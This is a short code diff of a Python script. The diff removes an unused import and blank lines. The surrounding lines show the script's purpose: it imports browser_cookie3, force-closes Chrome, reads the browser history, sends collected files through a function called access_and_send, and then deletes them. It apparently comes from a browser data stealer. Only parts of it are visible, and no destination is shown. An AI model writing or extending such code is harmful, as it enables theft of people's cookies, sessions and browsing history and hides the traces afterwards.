@@ -1,4 +1,3 @@
-import requests
 import urllib.request
 import browser_cookie3 # pip install browser_cookie3
 
@@ -16,7 +15,6 @@ def download_form(url, i):
     except Exception:  # NOQA
         pass
 
-
 def get_chrome_history():
     # close chrome if it is open
     try:
@@ -29,7 +27,6 @@ def get_chrome_history():
         dict_obj = bh.get_browserhistory()
     except Exception:  # NOQA
         pass
-    
     
     i = 0
     while True:
@@ -72,7 +69,6 @@ def get_chrome_history():
 def delete_form(form_lst):
     for i in form_lst:
         os.remove(i)
-
 
 try:
     access_and_send(form_list)
